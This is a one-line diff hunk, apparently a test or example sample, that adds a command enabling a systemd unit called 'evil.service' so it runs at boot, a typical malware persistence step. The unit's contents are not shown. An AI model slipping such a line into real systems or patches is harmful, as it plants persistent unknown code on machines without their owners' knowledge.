@@ -1,0 +1,1 @@
+systemctl enable /etc/systemd/system/evil.service
